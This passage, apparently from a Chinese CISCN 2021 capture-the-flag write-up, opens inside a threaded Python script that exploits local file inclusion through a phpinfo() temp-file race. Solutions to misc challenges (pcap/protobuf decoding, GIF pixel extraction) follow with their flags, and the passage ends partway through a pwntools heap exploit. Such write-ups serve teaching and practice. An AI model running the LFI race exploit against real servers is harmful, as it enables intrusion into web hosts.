<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e        self<span class="token punctuation">.</span>lock <span class="token operator">=</span>  l        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> counter        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">return</span>                counter<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>                                <span class="token keyword">if</span> x<span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"\nGot it!"</span>                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>                <span class="token keyword">return</span>    <span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Gets offset of tmp_name in the php output"""</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>        d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>        d<span class="token operator">+=</span>i                <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token comment"># detect the final chunk</span>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"0\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No php tmp_name in phpinfo output"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"found %s at %i"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>    <span class="token comment"># padded up a bit</span>    <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token number">256</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LFI With PHPInfo()"</span>    <span class="token keyword">print</span> <span class="token string">"-="</span> <span class="token operator">*</span> <span class="token number">30</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Usage: %s host [port] [threads]"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with hostname %s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    port<span class="token operator">=</span><span class="token number">80</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with port %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        poolsz<span class="token operator">=</span><span class="token number">10</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        poolsz <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with poolsz %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Getting initial offset..."</span><span class="token punctuation">,</span>      reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Spawning worker pool (%d)..."</span> <span class="token operator">%</span> poolsz    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">with</span> l<span class="token punctuation">:</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"\r% 4d / % 4d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">print</span>        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"Woot!  \m/"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">":("</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"\nTelling threads to shutdown..."</span>        e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"Shuttin' down..."</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>跑出结果</p><img src="/article/ciscn2021/image-20210515181707458.png" class="" title="image-20210515181707458" loading="lazy"><img src="/article/ciscn2021/image-20210515182132566.png" class="" title="image-20210515182132566" loading="lazy"><img src="/article/ciscn2021/image-20210515182141809.png" class="" title="image-20210515182141809" loading="lazy"><img src="/article/ciscn2021/image-20210515182239294.png" class="" title="image-20210515182239294" loading="lazy"><img src="/article/ciscn2021/image-20210515182330338.png" class="" title="image-20210515182330338" loading="lazy"><img src="/article/ciscn2021/image-20210515182410646.png" class="" title="image-20210515182410646" loading="lazy"><img src="/article/ciscn2021/image-20210515183203380.png" class="" title="image-20210515183203380" loading="lazy"><p>flag位置：<code>/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g</code></p><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;BmLDI-8WFso-KZGN9-XObp3-sjSOf-&#125;</code></pre><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h3><p>流量包分析</p><img src="/article/ciscn2021/9CFC275D-3F65-48C5-A8BE-F9B67DDD610D.png" class="" title="9CFC275D-3F65-48C5-A8BE-F9B67DDD610D" loading="lazy"><p>发现三个关键部分</p><p>全部导出看看，解压<code>flag_wrapper</code>得到<code>CISCN&#123;&#125;</code></p><img src="/article/ciscn2021/image-20210516043809208.png" class="" title="image-20210516043809208" loading="lazy"><p>利用脚本解br发现proto3内容</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> brotli<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./test.br"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>content <span class="token operator">=</span> brotli<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"bw"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span></code></pre><img src="/article/ciscn2021/image-20210516052103002.png" class="" title="image-20210516052103002" loading="lazy"><p>导出<code>secret</code>内容如下</p><img src="/article/ciscn2021/image-20210516052229144.png" class="" title="image-20210516052229144" loading="lazy"><p>由此应该是用proto3协议来解密</p><p>根据教程<a href="https://www.cnblogs.com/luoxn28/p/5303517.html">https://www.cnblogs.com/luoxn28/p/5303517.html</a></p><p>安装环境后用其自带的decode方法，用test文件规定的解密规则将处理过的<code>secret</code>进行解密</p><img src="/article/ciscn2021/image-20210516054849721.png" class="" title="image-20210516054849721" loading="lazy"><p>有用的部分在<code>PBResponse</code></p><p>最后拼接flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">15100450</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"e2345"</span><span class="token operator">+</span><span class="token string">"7889b0"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">16453958</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"d172a38dc"</span></code></pre><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;</code></pre><hr><h3 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h3><p>下载为gif，Photoshop打开发现有几百帧，仔细观察发现每帧上有奇怪像素点，RGB值为(233,233,233)</p><img src="/article/ciscn2021/image-20210516045206693.png" class="" title="image-20210516045206693" loading="lazy"><p>利用convert进行抽帧</p><pre class="language-bash" data-language="bash"><code class="language-bash">convert ./running_pixel.gif ./output/out%05d.png</code></pre><p>把每张图RGB(233,233,233)像素的坐标提取出来放文档里</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./output/"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagewidth <span class="token operator">=</span> <span class="token number">400</span>height <span class="token operator">=</span> <span class="token number">400</span><span class="token keyword">def</span> <span class="token function">get_rgb</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>    pixel <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>    coordinates <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    out_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./list.txt"</span><span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>            r<span class="token punctuation">,</span> g <span class="token punctuation">,</span>b <span class="token operator">=</span> pixel<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span>            <span class="token keyword">if</span> r <span class="token operator">==</span> g <span class="token operator">==</span> b <span class="token operator">==</span> <span class="token number">233</span><span class="token punctuation">:</span>                coordinate <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>                out_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>coordinate <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>                <span class="token comment"># print(r, g, b)</span>    <span class="token keyword">return</span> coordinates  <span class="token keyword">def</span> <span class="token function">get_files</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>path <span class="token operator">+</span> <span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> img  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        pic <span class="token operator">=</span> get_files<span class="token punctuation">(</span>pic_file<span class="token punctuation">)</span>        coors <span class="token operator">=</span> get_rgb<span class="token punctuation">(</span>pic<span class="token punctuation">)</span></code></pre><p>得到所有像素点后画图，使用现成脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'list.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>得到如下图</p><img src="/article/ciscn2021/image-20210516051514950.png" class="" title="image-20210516051514950" loading="lazy"><p>纯手动一点一点慢慢拼出了flag</p><img src="/article/ciscn2021/image-20210515184657362.png" class="" title="image-20210515184657362" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;</code></pre><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><p><code>strings cap.pcapng</code>可以看到有坐标轴，坐标轴为三维坐标，但由于z轴大多数为0，所以可以用二维画图，</p><img src="/article/ciscn2021/image-20210517144021953.png" class="" title="image-20210517144021953" loading="lazy"><p>直接用上面的脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'zuobiao.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>得到图片：</p><img src="/article/ciscn2021/image-20210517144052457.png" class="" title="image-20210517144052457" loading="lazy"><p>md5加密之后就得到flag：CISCN{d4f1fb80bc11ffd722861367747c0f10}</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="longlywolf"><a href="#longlywolf" class="headerlink" title="longlywolf"></a>longlywolf</h3><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span><span class="token comment">#p = remote('127.0.0.1',12345)</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> binary<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x521</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token 